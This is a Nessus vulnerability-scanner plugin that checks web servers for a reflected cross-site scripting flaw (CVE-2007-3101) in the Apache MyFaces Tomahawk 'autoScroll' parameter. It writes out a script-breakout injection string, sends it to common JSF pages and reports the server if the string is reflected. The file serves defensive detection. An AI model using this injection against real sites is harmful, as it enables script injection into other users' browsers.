#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25546);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2007-3101");
  script_bugtraq_id(24480);
  script_osvdb_id(36377);

  script_name(english:"Apache MyFaces Tomahawk JSF Application autoscroll Multiple XSS");
  script_summary(english:"Checks for an XSS flaw in a MyFaces JSF page");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server uses a JSP framework that is vulnerable to a
cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server uses an implementation of the Apache MyFaces
Tomahawk JSF framework that fails to sanitize user-supplied input to
the 'autoScroll' parameter before using it to generate dynamic
content.  An unauthenticated, remote attacker may be able to leverage
this issue to inject arbitrary HTML or script code into a user's
browser to be executed within the security context of the affected
site." );
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=544
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7f1297cd" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/471397/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"https://issues.apache.org/jira/browse/TOMAHAWK-983" );
  # https://issues.apache.org/jira/secure/ReleaseNote.jspa?version=12312536&styleName=Text&projectId=12310272
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dcdfb64e" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MyFaces Tomahawk version 1.1.6 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/19");
 script_set_attribute(attribute:"patch_publication_date", value: "2007/06/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/05/10");

 script_cvs_date("$Date: 2015/01/14 20:12:25 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:myfaces_tomahawk");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default: 80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0, "The web server on port "+port+" is vulnerable to cross-site scripting");

exploit = string("0,275);//--></script><script>alert('", SCRIPT_NAME, "'");

# Iterate over a couple of files and see if we can exploit the issue.
files = get_kb_list(string("www/", port, "/content/extensions/jsf"));
if (isnull(files)) files = make_list("/home.jsf", "/index.jsf");

max_files = 10;
n = 0;
foreach file (files)
{
  # Try to exploit the issue.
  w = http_send_recv3(method:"GET", 
    item:string(
      file, "?",
      "autoScroll=", urlencode(str:exploit)
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If it looks like MyFaces...
  if ("<!-- MYFACES JAVASCRIPT -->" >< res)
  {
    # There's a problem if we see our exploit.
    if (string("window.scrollTo(", exploit, ");") >< res)
    {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }

  # Unless we're paranoid, stop after the first check as the issue
  # affects the framework itself and it's unlikely we'll find 
  # multiple frameworks installed on the same server.
  if (report_paranoia < 2) exit(0);

  if (n++ > max_files) exit(0);
}
